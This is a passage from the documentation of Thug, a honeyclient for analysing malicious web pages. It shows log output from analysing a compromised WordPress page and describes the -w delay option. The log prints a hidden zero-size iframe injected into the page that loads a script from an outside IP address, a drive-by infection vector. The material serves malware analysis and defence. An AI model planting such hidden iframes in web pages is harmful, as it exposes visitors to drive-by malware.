<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:52<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span> <span class="o">(</span>Status: <span class="m">408</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:32:52<span class="o">]</span> <span class="o">[</span>Request Timeout<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span>
</pre></div>
</div>
<p>This is what we expect. Let’s prevent remote content fetching now while analyzing the same
locally saved page.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src $ thug -x ../samples/exploits/55875.html
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=utf-8&quot;</span> http-equiv<span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Acer Inc.&#39;s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for </span><span class="nv">$710</span><span class="s2"> million.  Acer said it ...&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;description&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;index,follow&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;robots&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Copyright (c)2007-2007 groundhogtech.com. All right reserved.&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;copyright&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;WordPress 2.2.1&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;generator&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> <span class="o">[</span>Meta<span class="o">]</span> Generator: WordPress <span class="m">2</span>.2.1
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;document&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;resource-type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/favicon.ico&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;shortcut icon&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css&quot;</span> <span class="nv">media</span><span class="o">=</span><span class="s2">&quot;screen&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/feed/&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;alternate&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Groundhogtech RSS Feed&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rss+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;pingback&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:01<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php?rsd&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;EditURI&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;RSD&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rsd+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08 <span class="m">10</span>:33:01<span class="o">]</span> &lt;iframe <span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
</pre></div>
</div>
</div>
<div class="section" id="other-useful-features">
<h2>Other useful features<a class="headerlink" href="#other-useful-features" title="Permalink to this headline">¶</a></h2>
<p>An interesting feature (introduced in Thug 0.4.13) allows you to define a maximum delay for
methods like setTimeout and setInterval which set a delay for executing a function. For instance
if the original code contains a statement like</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">do_stuff</span><span class="p">,</span> <span class="mf">60000</span><span class="p">);</span>
</pre></div>
</div>
<p>the code will sleep for 60 seconds before executing the function <cite>do_stuff</cite>. There are situations
where you would like to avoid wasting this time. In such cases, Thug provides the -w (–delay)
option. Simply running Thug this way (please note the interval is expressed in milliseconds)</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ thug -w <span class="m">2000</span> <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
</pre></div>
</div>
<p>will force a maximum delay of 2 seconds.</p>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="api.html" class="btn btn-neutral float-right" title="Thug API" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="configuration.html" class="btn btn-neutral float-left" title="Configuration" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        
        &copy; Copyright 2011-2020, Angelo Dell&#39;Aera

    </p>
  </div>
    
    
    
    Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a
    
    <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a>
    
    provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
  
    
   

</body>
</html>